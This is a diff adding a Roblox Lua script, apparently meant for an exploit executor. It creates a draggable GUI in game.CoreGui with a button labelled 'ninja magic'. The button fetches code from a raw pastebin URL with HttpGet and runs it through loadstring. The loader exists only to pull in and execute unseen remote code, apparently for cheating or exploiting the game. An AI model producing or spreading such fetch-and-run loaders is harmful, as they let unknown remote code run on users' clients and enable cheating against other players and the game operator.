@@ -1,0 +1,28 @@
+
+
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local TextButton = Instance.new("TextButton")
+
+--Properties:
+
+ScreenGui.Parent = game.CoreGui
+
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+Frame.Position = UDim2.new(0.252136767, 0, 0.276898742, 0)
+Frame.Size = UDim2.new(0, 296, 0, 161)
+Frame.Active = true
+Frame.Draggable = true
+
+TextButton.Parent = Frame
+TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextButton.Position = UDim2.new(0, 0, 0.521739125, 0)
+TextButton.Size = UDim2.new(0, 296, 0, 77)
+TextButton.Font = Enum.Font.SourceSans
+TextButton.Text = "ninja magic"
+TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton.TextSize = 63.000
+TextButton.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/bfxFW9a7", true))()
+end)
